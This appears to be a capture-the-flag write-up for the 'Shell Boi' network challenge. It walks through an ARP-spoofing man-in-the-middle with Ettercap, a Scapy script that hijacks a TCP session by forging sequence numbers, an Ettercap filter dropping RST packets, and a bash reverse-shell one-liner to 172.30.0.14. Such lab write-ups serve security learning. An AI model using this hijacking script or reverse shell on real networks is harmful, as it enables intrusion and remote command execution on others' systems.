---
description: >-
  Unencrypted remote shell leads to TCP session hijacking and RCE through
  man-in-the-middle (MITM) attack
---

# Shell Boi

## Challenge

He sells linux shells on the shell store.

**Author:** [f4lcon](https://twitter.com/theevilsyn)

## Solution

### Reconnaissance

When scanning the network, I found that only 172.30.0.5 and 172.30.0.8 were up. However, no ports seemed to be open.

Port 1337 on 172.30.0.5 was "open", but the service closes the connection immediately after the handshake is completed.

```
Nmap scan report for 172.30.0.5
Host is up (0.042s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE    VERSION
1337/tcp open  tcpwrapped
MAC Address: 02:42:1D:65:54:70 (Unknown)
```

172.30.0.8, on the other hand, had no open ports.

This is weird, the category was "Network Pentest"! Anyway, I theorized that perhaps 1337 was indeed open, but the firewall blocks anyone other than 172.30.0.8 from accessing the service?

### Man-in-the-Middle

Well, what better way to test this theory than to sniff the traffic? I tried using Ettercap to perform a man-in-the-middle between 172.30.0.5 and 172.30.0.8, and it worked! There were no defences in place, and I could now sniff the traffic between them.

Filtering the traffic on port 1337, we can see quite a lot of connections. Let's start with following one of those connections:

![](<../../.gitbook/assets/image (56).png>)

172.30.0.8 is sending the following base 64 encoded message to 172.30.0.5, on port 1337:

![](<../../.gitbook/assets/image (58).png>)

The two lines translate to 172.30.0.8 and 34599 respectively.

Hm... filtering the traffic on port 34599, some interesting traffic appears:

![](<../../.gitbook/assets/image (59).png>)

Okay, now we understand what is happening.

* 172.30.0.8, the client, sends a request to the server in the form of a base 64 encoded message specifying the receiving IP address and port number.
* 172.30.0.5, the server, upon receiving the request, sends an unencrypted shell to the specified IP address and port number.

### Hijacking the Session

Essentially, we need to intercept the TCP connection, and spoof a response containing our custom command to the server. This is called **TCP session hijacking**, which builds on top of a MITM attack. The idea is that we have to calculate the correct SEQ and ACK numbers, in order to spoof a packet as the client.

In a TCP connection, if invalid SEQ numbers are received, the receiver simply discards the packets. Initial sequence numbers (ISNs) are thus randomised, preventing SEQ numbers from being predicted. Arbitrarily injected packets by an attacker "guessing" the SEQ number would therefore be likely to have invalid SEQ numbers. \*\*\*\*

However, if an attacker is able to achieve a man-in-the-middle attack, it would be trivial to obtain the relevant SEQ numbers of TCP packets transmitted between two nodes.

![](https://lh5.googleusercontent.com/22lSaL0ogOMcs18PYt33A84ORcf7JXfuyD\_ZYwTBAw5y5u\_vyCwNDpZQfxKgP63YvD9-X2\_bZSC\_1EQxnu1AP0IhYPXIsD-d\_YY5go8SPTZDiZGGo4R53qMm6KMmHjZVwn1H68Nr)

The following script implements this (this script is run _after_ first establishing a MITM using Ettercap - we could also use Scapy to implement the MITM, but it gets really messy and Scapy faces its own limitations too).

```python
from scapy.all import *
import argparse
import global_vars


def sniff_parser(packet):
    if IP in packet:
        print(packet.summary())


def sniffer_thread(callback, pkt_filter, iface):
    while True:
        sniff(
            prn=callback,
            filter=pkt_filter,
            count=1,
            iface=iface
        )


def forge_response(p, command):

	print(f"Received: SEQ {p[TCP].seq}, ACK {p[TCP].ack}, Payload {p[TCP].payload}")

	ip_total_len = p[IP].len
	ip_header_len = p[IP].ihl * 32 // 8
	tcp_header_len = p[TCP].dataofs * 32 // 8
	tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len

	# Send command to server
	cmd_ether = Ether(src=p[Ether].dst, dst=p[Ether].src)
	cmd_ip = IP(src=p[IP].dst, dst=p[IP].src)
	cmd_tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + tcp_seg_len, flags="PA")

	command = command + '\r\n'
	cmd = cmd_ether / cmd_ip / cmd_tcp / command

	return cmd
	

def hijack(p):

	data = str(p[TCP].payload)
	print("Received:", data)
	
	if 'root' not in data:
		return
		
	cmd = forge_response(p, global_vars.CMD)
		
	print('Spoofed command: ', cmd[TCP].payload)

	print("[+] Executing command...")
	sendp(cmd, verbose=0, iface=global_vars.IFACE)

	# sys.exit(0)


def main():
    
    parser = argparse.ArgumentParser()

    parser.add_argument(
        '-i', '--interface', default=conf.iface, help='Interface to use.'
    )

    parser.add_argument(
        'client', help='Client IP address.'
    )
    parser.add_argument(
        'server', help='Server IP address.'
    )

    parser.add_argument(
        'cmd', help='A command to execute.'
    )

    args = parser.parse_args()

    global_vars.MY_MAC = get_if_hwaddr(args.interface)
    global_vars.MY_IP = get_if_addr(args.interface)
    global_vars.IFACE = args.interface
    global_vars.CMD = args.cmd
    
    pkt_filter = f"src host {args.server} and tcp"
    
    sniffer = Thread(target=sniffer_thread, args=(hijack, pkt_filter, global_vars.IFACE))
    sniffer.start()


if __name__ == '__main__':
    main()
```

One small problem, though. When the client (172.30.0.8) sends an RST, the connection is closed before we get a chance to send our spoofed command! To get around this, I used the following Ettercap filter to drop the RST and RST, ACK packets.

```c
if (ip.src == '172.30.0.8') {
	if (tcp.flags == 4 || tcp.flags == 20) {
		drop();
		msg("Filter Ran.\n");
	}
}	
```

The syntax for running Ettercap with the filter is:

`ettercap -T -q -i tap0 -F shellboi.ef -M ARP /172.30.0.5\;172.30.0.8///`

Now, we can run the Python script and specify our desired command. Our command is `bash -c "bash -i >& /dev/tcp/172.30.0.14/1337 0>&1"`, which sends a reverse shell from the server to us.

![](../../.gitbook/assets/upload\_c478bfc59bf91c2651693ff0c0c0745e.png)

The next time that a shell is sent to the client, our script will intercept the traffic and send the reverse shell payload to the server, allowing us to catch a shell, and obtain the flag.

![](<../../.gitbook/assets/image (61).png>)

The flag is `inctf{Ha!Security_1s_4_my7h!!!}`.

_And that, everyone, is why we use SSH instead of Telnet._

### On Hindsight...

There was an easier way to solve this. After performing the ARP spoofing attack using Ettercap, we could have just forged the base 64 encoded request, specifying the IP address and port of our choice to receive the shell (no scripting required?).

But hey, this was more fun, and probably more realistic!
